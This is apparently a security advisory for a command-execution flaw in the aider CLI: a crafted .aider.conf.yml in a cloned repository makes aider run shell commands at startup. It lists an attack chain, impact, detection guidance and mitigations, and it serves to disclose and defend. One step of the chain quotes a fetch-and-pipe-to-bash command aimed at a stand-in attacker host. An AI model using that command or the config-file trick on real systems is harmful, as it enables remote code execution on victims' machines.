---
title: Arbitrary Command Execution in aider via Malicious Configuration Files
slug: 2026-09-aider-arbitrary-command-execution
description: The aider CLI tool is vulnerable to arbitrary command execution because it automatically executes shell commands defined in a .aider.conf.yml file located in the root of a Git repository upon startup.
date: "2026-09-04T15:31:07Z"
type: advisory
types:
  - advisory
severities:
  - high
cpes:
  - cpe:2.3:a:aider:aider:*:*:*:*:*:*:*:*
tags:
  - vulnerability
  - remote-code-execution
  - aider
  - cli-tool
vendors:
  - Aider
products:
  - aider (<= 0.86.3.dev)
mitre_ttps:
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059
    technique_name: Command and Scripting Interpreter
    evidence: A crafted repository can set test-cmd (executed at startup) or lint-cmd (executed on the first file edit), which aider runs through a shell (subprocess with shell=True).
    confidence_band: high
cves:
  - id: CVE-2026-85674
    cvss: 7.8
references:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-85674
rules:
  - title: Detect Aider Spawned Shell Processes
    description: Detects when the aider utility spawns a shell process, which is indicative of potential command execution via the .aider.conf.yml configuration vulnerability (CVE-2026-85674).
    platform: sigma
    severity: high
    tactics:
      - execution
    techniques:
      - T1059.003
    data_sources:
      - process_creation
rules_count: 1
action_plan:
  priority: elevated
  owners:
    - SOC
    - Detection Engineering
  immediate_actions:
    - action: Deploy Sigma rule to identify subprocess spawning from aider.
      owner: Detection Engineering
      due: 24h
      evidence: CVE-2026-85674
  mitigation_plan:
    - priority: immediate
      action: Advise development teams to audit or delete .aider.conf.yml files in cloned repos.
      owner: IT Operations
      addresses: CVE-2026-85674
      evidence: Source documentation of configuration file parsing.
---

Aider (aider-chat), a popular AI-assisted command-line interface, contains a critical security flaw identified as CVE-2026-85674. The vulnerability arises because the tool automatically discovers and parses a .aider.conf.yml configuration file from the root of the active Git repository. If an attacker controls the repository, they can define 'test-cmd' or 'lint-cmd' configuration parameters. Aider executes these commands via a subprocess with shell=True at startup or upon the first file edit. This process requires no LLM interaction, API key validation, or user confirmation, leading to immediate arbitrary command execution on the victim's host machine. The issue has been confirmed in version 0.86.3.dev and earlier versions. This represents a significant risk for developers who clone and interact with untrusted repositories using the aider tool.

## Attack Chain

1. Attacker creates a malicious Git repository containing a crafted .aider.conf.yml file.
2. Attacker sets the 'test-cmd' parameter in the YAML file to a malicious command (e.g., 'curl -s http://attacker.com/payload | bash').
3. Attacker pushes the repository to a public platform or distributes the repository archive to a target developer.
4. Victim clones the malicious repository to their local machine.
5. Victim navigates to the repository root and executes the 'aider' command.
6. Aider automatically identifies the .aider.conf.yml file in the current directory and reads the 'test-cmd' parameter.
7. Aider invokes a shell process ('/bin/sh -c' or 'cmd.exe /c') to execute the malicious 'test-cmd' string.
8. Attacker-supplied code executes with the privileges of the local user, leading to host compromise.

## Impact

Successful exploitation results in arbitrary command execution on the host machine. Given that developers frequently clone repositories to inspect code, this vulnerability allows attackers to target the development environment directly, potentially leading to credential theft, source code exfiltration, or lateral movement within the victim's network. All users of aider versions 0.86.3.dev and earlier are affected across Windows, Linux, and macOS environments.

## Recommendation

Prioritize the following actions to mitigate the risk associated with CVE-2026-85674:

- Instruct developers to cease usage of 'aider' within untrusted or newly cloned repositories until the software is patched.
- Implement strict code-review practices for any .aider.conf.yml files found in repositories before interacting with them using the 'aider' tool.
- Deploy the Sigma rule below to detect subprocess execution initiated by the aider binary.
- Monitor for unusual process lineage where 'aider' or 'aider-chat' spawns shell interpreters (cmd.exe, powershell.exe, bash, sh).
